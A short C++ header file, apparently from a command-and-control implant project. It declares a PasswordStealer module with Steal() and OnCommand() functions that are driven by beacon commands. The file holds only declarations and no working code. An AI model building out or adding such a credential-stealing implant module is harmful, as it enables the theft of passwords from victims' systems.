#pragma once
#include "../beacon.h"

namespace PasswordStealer {
    void Steal();
    void OnCommand(const Beacon::Command& cmd);
}